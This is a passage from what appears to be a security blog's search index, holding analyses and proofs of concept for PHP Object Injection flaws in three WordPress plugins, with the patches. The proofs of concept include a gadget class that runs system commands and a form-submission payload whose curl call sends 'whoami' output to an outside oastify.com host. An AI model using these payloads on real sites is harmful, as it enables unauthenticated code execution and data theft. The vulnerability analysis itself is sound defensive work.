injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Responsive Slider by MetaSlider: 3.94.0 – vulnerable 3.95.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v3.94.0): Slideshows.php v3.94.0 if (isset($slideshow['meta']) \u0026\u0026 is_array($slideshow['meta'])) { foreach ($slideshow['meta'] as $key =\u003e $value) { update_post_meta( $new_slideshow_id, $key, maybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value)) ); } } In this code, the maybe_unserialize() function is called directly on user-controlled data ($value). Since these values are not validated before being unserialized, an attacker can inject malicious serialized payloads leading to PHP Object Injection. Patch (v3.95.0): Patch diff The patch adds two critical protections to prevent malicious data from being unserialized: Block any meta value that is a serialized object (O:). If detected, the import process stops and the slideshow is deleted. Slideshows.php v3.95.0 if (isset($slideshow['meta']) \u0026\u0026 is_array($slideshow['meta'])) { foreach ($slideshow['meta'] as $key =\u003e $value) { // @since 3.95 - Stop the process and cleanup if we catch non valid data in JSON if ( is_serialized( $value ) \u0026\u0026 substr( trim( $value ), 0, 2 ) === 'O:' ) { wp_trash_post($new_slideshow_id); return new WP_Error( 'import_slideshow_error', esc_html__( 'Import file is invalid.', 'ml-slider' ) ); } update_post_meta( $new_slideshow_id, $key, $this-\u003emaybe_unserialize(str_replace('{#ID#}', $new_slideshow_id, $value)) ); } } Replace maybe_unserialize() with a safer version using unserialize(..., ['allowed_classes' =\u003e false]) to prevent object creation during unserialization. Slideshows.php v3.95.0 public function maybe_unserialize( $data ) { if ( is_serialized( $data ) ) { // Don't attempt to unserialize data that wasn't serialized going in. return @unserialize( trim( $data ), array( 'allowed_classes' =\u003e false ) ); } return $data; } This eliminates the PHP Object Injection risk. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a POST API: api.php v3.94.0 protected $namespace = 'metaslider/v1'; register_rest_route($this-\u003enamespace, '/slideshow/import', array(array( 'methods' =\u003e 'POST', 'callback' =\u003e array($this-\u003eapi, 'import_slideshows'), 'permission_callback' =\u003e array($this-\u003eapi, 'can_access') ))); with callback import_slideshows and permission validated via can_access(). api.php v3.94.0 const DEFAULT_CAPABILITY_EDIT_SLIDES = 'edit_others_posts'; public function can_access() { $capability = apply_filters('metaslider_capability', MetaSliderPlugin::DEFAULT_CAPABILITY_EDIT_SLIDES); // Check for the nonce on the server (used by WP REST) if (isset($_SERVER['HTTP_X_WP_NONCE']) \u0026\u0026 wp_verify_nonce(sanitize_key($_SERVER['HTTP_X_WP_NONCE']), 'wp_rest')) { return current_user_can($capability); } // This is for when not using Axios (example: callout.php) if (isset($_REQUEST['METASLIDER_NONCE']) \u0026\u0026 wp_verify_nonce(sanitize_key($_REQUEST['METASLIDER_NONCE']), 'metaslider_request')) { return current_user_can($capability); } return false; } This function only allows users with edit_others_posts capability (Editor or higher) to call the API. It validates in two ways: If the X-WP-Nonce header exists, the plugin verifies the 'wp_rest' nonce and checks the capability. If the METASLIDER_NONCE parameter exists, the plugin verifies the 'metaslider_request' nonce and checks the capability. If neither is valid, API access is denied. api.php v3.94.0 public function import_slideshows($request) { if (!$this-\u003ecan_access()) { $this-\u003edeny_access(); } $data = $this-\u003eget_request_data($request, array('slideshows')); if (!$data['slideshows']) { wp_send_json_error(array( 'message' =\u003e __('Nothing to import.', 'ml-slider') ), 400); } $status = $this-\u003eslideshows-\u003eimport((array) json_decode($data['slideshows'], true)); if (is_wp_error($status)) { wp_send_json_error(array( 'message' =\u003e $status-\u003eget_error_message() ), 400); } wp_send_json_success($status, 200); } import_slideshows(): Permission check – if can_access() returns false → block via deny_access(). Extract input data – get the slideshows field; if empty → return “Nothing to import”. JSON decode and import – decode slideshows and call $this-\u003eslideshows-\u003eimport(). Error handling – if WP_Error returned → send JSON error. Success – if no error → send JSON success with import result. According to import(), $slideshows is the exported data from created slideshows. Quote /** Will import slideshows @param array $slideshows - The data generated by the export method @throws Exception - handled within method. @return WP_Error|array - True on success, WP_Error on failure */ Slideshows.php v3.94.0 foreach ($slideshows as $index =\u003e $slideshow) { ... foreach ($slideshow['slides'] as $slide) { ... foreach ($slide['meta'] as $key =\u003e $value) { $value = $this-\u003erestore_image_urls_from_string($value); add_post_meta($new_slide_id, $key, maybe_unserialize($value)); } } ... } The import() function loops through each slideshow, then each slide, then each meta. Each meta value is restored using $this-\u003erestore_image_urls_from_string($value) and stored with add_post_meta($new_slide_id, $key, maybe_unserialize($value)). In other words, the code imports the entire slideshow, slides, and meta while processing image URLs and unserializing data before saving to the database. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"] B --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"} C -- Fail --\u003e Z[\"deny_access()\"] C -- Pass --\u003e D[\"Extract 'slideshows' from request\"] D --\u003e E[\"json_decode(slideshows) → array of slideshow data\"] E --\u003e F[\"slideshows-\u003eimport() begins\"] F --\u003e G[\"foreach ($slideshows as $slideshow)\"] G --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"] H --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"] I --\u003e J[\"value = restore_image_urls_from_string(value)\"] J --\u003e K{\"Is value serialized?\"} K -- Yes --\u003e L[\"maybe_unserialize(value)\"] K -- No --\u003e M[\"Store meta normally\"] L --\u003e N{\"Does unserialize create an object?\"} N -- Yes --\u003e R[\"Object Injection → POP chain execution\"] N -- No --\u003e M M --\u003e O[\"add_post_meta(new_slide_id, key, value)\"] O --\u003e P[\"Import continues for remaining slideshows\"] R --\u003e Q[\"Exploit achieved\"] graph TD A[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"] B --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"} C -- Fail --\u003e Z[\"deny_access()\"] C -- Pass --\u003e D[\"Extract 'slideshows' from request\"] D --\u003e E[\"json_decode(slideshows) → array of slideshow data\"] E --\u003e F[\"slideshows-\u003eimport() begins\"] F --\u003e G[\"foreach ($slideshows as $slideshow)\"] G --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"] H --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"] I --\u003e J[\"value = restore_image_urls_from_string(value)\"] J --\u003e K{\"Is value serialized?\"} K -- Yes --\u003e L[\"maybe_unserialize(value)\"] K -- No --\u003e M[\"Store meta normally\"] L --\u003e N{\"Does unserialize create an object?\"} N -- Yes --\u003e R[\"Object Injection → POP chain execution\"] N -- No --\u003e M M --\u003e O[\"add_post_meta(new_slide_id, key, value)\"] O --\u003e P[\"Import continues for remaining slideshows\"] R --\u003e Q[\"Exploit achieved\"] graph TD A[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"] B --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"} C -- Fail --\u003e Z[\"deny_access()\"] C -- Pass --\u003e D[\"Extract 'slideshows' from request\"] D --\u003e E[\"json_decode(slideshows) → array of slideshow data\"] E --\u003e F[\"slideshows-\u003eimport() begins\"] F --\u003e G[\"foreach ($slideshows as $slideshow)\"] G --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"] H --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"] I --\u003e J[\"value = restore_image_urls_from_string(value)\"] J --\u003e K{\"Is value serialized?\"} K -- Yes --\u003e L[\"maybe_unserialize(value)\"] K -- No --\u003e M[\"Store meta normally\"] L --\u003e N{\"Does unserialize create an object?\"} N -- Yes --\u003e R[\"Object Injection → POP chain execution\"] N -- No --\u003e M M --\u003e O[\"add_post_meta(new_slide_id, key, value)\"] O --\u003e P[\"Import continues for remaining slideshows\"] R --\u003e Q[\"Exploit achieved\"] graph TD A[\"Editor sends POST request → /metaslider/v1/slideshow/import\"] --\u003e B[\"import_slideshows() invoked\"] B --\u003e C{\"can_access(): verify nonce + 'edit_others_posts' capability\"} C -- Fail --\u003e Z[\"deny_access()\"] C -- Pass --\u003e D[\"Extract 'slideshows' from request\"] D --\u003e E[\"json_decode(slideshows) → array of slideshow data\"] E --\u003e F[\"slideshows-\u003eimport() begins\"] F --\u003e G[\"foreach ($slideshows as $slideshow)\"] G --\u003e H[\"foreach ($slideshow['slides'] as $slide)\"] H --\u003e I[\"foreach ($slide['meta'] as key =\u003e value)\"] I --\u003e J[\"value = restore_image_urls_from_string(value)\"] J --\u003e K{\"Is value serialized?\"} K -- Yes --\u003e L[\"maybe_unserialize(value)\"] K -- No --\u003e M[\"Store meta normally\"] L --\u003e N{\"Does unserialize create an object?\"} N -- Yes --\u003e R[\"Object Injection → POP chain execution\"] N -- No --\u003e M M --\u003e O[\"add_post_meta(new_slide_id, key, value)\"] O --\u003e P[\"Import continues for remaining slideshows\"] R --\u003e Q[\"Exploit achieved\"] ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Create any slideshow, export to get a sample JSON file. Modify the JSON file so that the ml-slider_type field (or any iterated field) contains a serialized string. Example: Re-import the modified JSON file. Result ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability occurs because the plugin calls maybe_unserialize() directly on imported data without validation, allowing injection of malicious serialized payloads that lead to PHP Object Injection. Version 3.95.0 fixes this by blocking serialized objects and using a safer unserialize function. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:7:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never unserialize user-controlled data without validation. Import/export features are always sensitive attack surfaces. Serialized data (especially starting with O:) must be controlled. Use allowed_classes =\u003e false to prevent object creation during unserialize. ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:8:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Responsive Slider by MetaSlider Plugin \u003c= 3.94.0 is vulnerable to PHP Object Injection ","date":"2025-11-26","objectID":"/posts/2025-11-26-cve-2025-26763/:9:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-26763 Analysis \u0026 POC","uri":"/posts/2025-11-26-cve-2025-26763/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Everest Forms Plugin.","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info Plugin Everest Forms – Contact Form, Quiz, Survey, Newsletter \u0026 Payment Form Builder for WordPress on WordPress contains a PHP Object Injection vulnerability in all versions up to and including 3.1.1, through unsafe unserialization of untrusted data from the parameter field_value. This allows an unauthenticated attacker to inject a PHP object. The vulnerable software does not contain any known POP chain, meaning the flaw will not lead to practical exploitation unless another plugin or theme on the website contains a compatible POP chain. If such a POP chain exists through an additional plugin or theme installed on the target system, it may allow the attacker to perform actions such as arbitrary file deletion, data theft, or even remote code execution, depending on the available POP chain. CVE ID: CVE-2025-3439 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.1.1 Patched Versions: 3.1.2 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Everest Forms Plugin ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Everest Forms: 3.1.1 – vulnerable 3.1.2 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v3.1.1): html-admin-page-entries-view.php if ( ! empty( $field_value ) || is_numeric( $field_value ) ) { if ( is_serialized( $field_value ) ) { $field_value = maybe_unserialize( $field_value ); } ... } In this snippet, maybe_unserialize() is directly executed on user-provided input ($field_value). This introduces a critical risk: Object Injection Risk: If the attacker embeds a PHP object payload within serialized data, the decode and unserialize process will instantiate a malicious object, potentially leading to Object Injection and escalation towards Remote Code Execution (RCE). Missing safety validation: No data validation is performed before unserialization. No fallback handling: If the input is invalid or malicious, no alternative error processing is performed, leaving the system open to exploitation. The patch (v3.1.2): Patch changes The patch replaces maybe_unserialize() with a safer function evf_maybe_unserialize(): evf-core-functions.php function evf_maybe_unserialize( $data, $options = array() ) { if ( is_serialized( $data ) ) { if ( version_compare( PHP_VERSION, '7.1.0', '\u003e=' ) ) { $options = wp_parse_args( $options, array( 'allowed_classes' =\u003e false ) ); return @unserialize( trim( $data ), $options ); //phpcs:ignore. } return @unserialize( trim( $data ) ); //phpcs:ignore. } return $data; } Using unserialize() with 'allowed_classes' =\u003e false completely removes the ability to instantiate objects, effectively eliminating the vulnerability. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a submenu Entries: class-evf-admin-menus.php add_submenu_page( 'everest-forms', esc_html__( 'Everest Forms Entries', 'everest-forms' ), esc_html__( 'Entries', 'everest-forms' ), current_user_can( 'everest_forms_view_entries' ) ? 'everest_forms_view_entries' : 'everest_forms_view_others_entries', 'evf-entries', array( $this, 'entries_page' ) ); Callback entries_page is executed when accessing this submenu: class-evf-admin-menus.php public function entries_page() { EVF_Admin_Entries::page_output(); } The function calls page_output(): class-evf-admin-entries.php public static function page_output() { if ( apply_filters( 'everest_forms_entries_list_actions', false ) ) { do_action( 'everest_forms_entries_list_actions_execute' ); } elseif ( isset( $_GET['view-entry'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification include 'views/html-admin-page-entries-view.php'; } else { self::table_list_output(); } } When $_GET['view-entry'] exists, the view html-admin-page-entries-view.php is included. Entries Page This page displays all submitted form input. html-admin-page-entries-view.php $entry_meta = apply_filters( 'everest_forms_entry_single_data', $entry-\u003emeta, $entry, $form_data ); ... foreach ( $entry_meta as $meta_key =\u003e $meta_value ) { $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value ); if ( evf_is_json( $meta_value ) ) { $meta_value = json_decode( $meta_value, true ); $meta_value = $meta_value['value']; } ... $field_value = apply_filters( 'everest_forms_html_field_value', $meta_value, $entry_meta[ $meta_key ], $entry_meta, 'entry-single' ); ... if ( ! empty( $field_value ) || is_numeric( $field_value ) ) { if ( is_serialized( $field_value ) ) { $field_value = maybe_unserialize( $field_value ); } ... } ... } $entry_meta represents user-submitted form data. Each item contains a meta_key and a meta_value, and the system loops through them: If the value is JSON evf_is_json() determines whether the string is valid JSON. If yes, json_decode() extracts the decoded content via $meta_value['value']. Then $field_value is generated Passed through the filter everest_forms_html_field_value. If serialized maybe_unserialize() is used to decode it — this is the security flaw. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() → meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"] N --\u003e|No| L graph TD A[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() → meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"] N --\u003e|No| L graph TD A[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() → meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"] N --\u003e|No| L graph TD A[\"User submits form → Data stored in $entry_meta\"] --\u003e B[\"Admin opens Entries page in wp-admin\"] B --\u003e C[\"entries_page() executed\"] C --\u003e D{\"GET['view-entry'] exists?\"} D --\u003e|No| Z[\"Show entries table\"] D --\u003e|Yes| E[\"Load html-admin-page-entries-view.php\"] E --\u003e F[\"foreach ($entry_meta as meta_key =\u003e meta_value)\"] F --\u003e G{\"Is meta_value JSON?\"} G --\u003e|Yes| H[\"json_decode() → meta_value['value']\"] G --\u003e|No| I[\"meta_value = wp_strip_all_tags()\"] H --\u003e J[\"field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)\"] I --\u003e J J --\u003e K{\"field_value is serialized?\"} K --\u003e|No| L[\"Display value normally\"] K --\u003e|Yes| M[\"maybe_unserialize(field_value) ← Vulnerable\"] M --\u003e N{\"Unserialize produces object?\"} N --\u003e|Yes| R[\"Object Injection → Possible exploit if POP chain exists\"] N --\u003e|No| L ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Submit a form with JSON-encoded serialized payload: POST /2025/11/22/test/ HTTP/1.1 Host: localhost ... Content-Disposition: form-data; name=\"everest_forms[form_fields][fullname]\" {\"value\":\"a:1:{i:0;O:4:\\\"Evil\\\":1:{s:7:\\\"command\\\";s:74:\\\"curl http:\\/\\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\\\";}}\"} ------geckoformboundary8355bd6da3783bb27aa92837fe803a6e ... Administrator opens the entry: Result ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability exists because maybe_unserialize() is used directly on user-supplied data without restricting which PHP classes may be instantiated, leading to PHP Object Injection. If a POP chain is present in another plugin or theme, an unauthenticated attacker may escalate to dangerous actions such as reading/writing/deleting files or even remote code execution. The patch uses evf_maybe_unserialize() with allowed_classes =\u003e false, fully neutralizing the issue. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:7:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Root cause: Use of maybe_unserialize() on user-controlled data without restricting classes. Impact: Object Injection, potentially RCE if a compatible POP chain exists. Attack surface: Triggered when an admin opens the Entries page; malicious payload is already stored. Fix: Use unserialize() with allowed_classes = false, preventing object creation. Lesson learned: Any unserialization must restrict allowed classes or switch to safer formats like JSON. ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:8:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Everest Forms Plugin \u003c= 3.1.1 is vulnerable to PHP Object Injection ","date":"2025-11-25","objectID":"/posts/2025-11-25-cve-2025-3439/:9:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-3439 Analysis \u0026 POC","uri":"/posts/2025-11-25-cve-2025-3439/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Tabs Plugin.","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Deserialization of Untrusted Data vulnerability in ShapedPlugin LLC WP Tabs allows Object Injection. This issue affects WP Tabs from unspecified versions up to version 2.2.12. CVE ID: CVE-2025-48134 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 2.2.12 Patched Versions: 2.2.13 CVSS severity: High (7.2) Required Privilege: Administrator Product: WordPress WP Tabs Plugin ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WP Tabs: 2.2.12 – vulnerable 2.2.13 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v2.2.12): class-wp-tabs-import-export.php $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); In this code, the maybe_unserialize() function is called directly on user data ($value after replacing '{#ID#}' with $new_tabs_id). This creates a critical vulnerability: Object Injection risk: If an attacker injects a PHP object payload into base64 data, decoding and unserialization will instantiate the malicious object, leading to Object Injection and potentially Remote Code Execution (RCE). Lack of safety checks: No validation is performed before unserializing. No fallback mechanism: If the data is invalid or corrupted, the system has no alternative handling, making the application exploitable. Patch (v2.2.13): Patch changes The patch uses unserialize with 'allowed_classes' =\u003e false, completely removing the ability to instantiate objects and fully mitigating the vulnerability. ","date":"2025-11-24","objectID":"/posts/2025-11-24-cve-2025-48134/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-48134 Analysis \u0026 POC","uri":"/posts/2025-11-24-cve-2025-48134/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an AJAX endpoint for logged-in users (wp_ajax_): class-wp-tabs.php $this-\u003eloader-\u003eadd_action( 'wp_ajax_tabs_import_shortcode', $import_export, 'import_shortcode' ); Accessing the endpoint /wp-admin/admin-ajax.php with action=tabs_import_shortcode calls the import_shortcode callback: class-wp-tabs-import-export.php public function import_shortcode() { $nonce = ( ! empty( $_POST['nonce'] ) ) ? sanitize_text_field( wp_unslash( $_POST['nonce'] ) ) : ''; if ( ! wp_verify_nonce( $nonce, 'wptabspro_options_nonce' ) ) { wp_send_json_error( array( 'message' =\u003e esc_html__( 'Error: Nonce verification has failed. Please try again.', 'wp-expand-tabs-free' ) ), 401 ); } $allow_tags = isset( $_POST['unSanitize'] ) ? sanitize_text_field( wp_unslash( $_POST['unSanitize'] ) ) : ''; // Don't worry sanitize after JSON decode below. $data = isset( $_POST['shortcode'] ) ? wp_unslash( $_POST['shortcode'] ) : '';//phpcs:ignore $data = json_decode( $data ); $data = json_decode( $data, true ); $shortcodes = $allow_tags ? $data['shortcode'] : wp_kses_post_deep( $data['shortcode'] ); if ( ! $data ) { wp_send_json_error( array( 'message' =\u003e __( 'Nothing to import.', 'wp-expand-tabs-free' ), ), 400 ); } $status = $this-\u003eimport( $shortcodes ); if ( is_wp_error( thing: $status ) ) { wp_send_json_error( array( 'message' =\u003e $status-\u003eget_error_message(), ), 400 ); } wp_send_json_success( $status, 200 ); } The function checks the nonce; if invalid, it returns an error and stops execution. Testing the plugin, the import feature is found at /wp-admin/edit.php?post_type=sp_wp_tabs\u0026page=tab_tools#tab=2. Import feature This feature is restricted to Administrators, so a valid nonce must belong to an Administrator. The uploaded JSON file is assigned to the shortcode parameter in the POST request: $data = isset( $_POST['shortcode'] ) ? wp_unslash( $_POST['shortcode'] ) : '';//phpcs:ignore $data = json_decode( $data ); $data = json_decode( $data, true ); The plugin decodes JSON twice. In the second call, associative=true converts JSON objects into PHP arrays as described: Quote @param $associative: When true, JSON objects will be returned as associative arrays; when false, JSON objects will be returned as objects. When null, JSON objects will be returned as associative arrays or objects depending on whether JSON_OBJECT_AS_ARRAY is set in the flags. Then import( $shortcodes ) is called with $shortcodes as $data['shortcode']. Current JSON upload structure: class-wp-tabs-import-export.php public function import( $shortcodes ) { $errors = array(); foreach ( $shortcodes as $index =\u003e $shortcode ) { $errors[ $index ] = array(); $new_tabs_id = 0; try { ... if ( isset( $shortcode['meta'] ) \u0026\u0026 is_array( $shortcode['meta'] ) ) { foreach ( $shortcode['meta'] as $key =\u003e $value ) { if ( 'sp_tab_source_options' === $key || 'sp_tab_shortcode_options' === $key ) { $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); update_post_meta( $new_tabs_id, $key, $sanitize_value ); } } } } catch ( Exception $e ) { array_push( $errors[ $index ], $e-\u003egetMessage() ); // If there was a failure somewhere, clean up. wp_trash_post( $new_tabs_id ); } ... } $errors = reset( $errors ); return isset( $errors[0] ) ? new WP_Error( 'import_tabs_error', $errors[0] ) : $shortcodes; } The function loops through shortcodes and checks if shortcode['meta'] exists as an array; if so, it iterates over $shortcode['meta']. $sanitize_value = $this-\u003esanitize_and_collect_metabox_data( $key, maybe_unserialize( str_replace( '{#ID#}', $new_tabs_id, $value ) ) ); If the key is sp_tab_source_options or sp_tab_shortcode_options: Replace {#ID#} in the value with $new_tabs_id Call 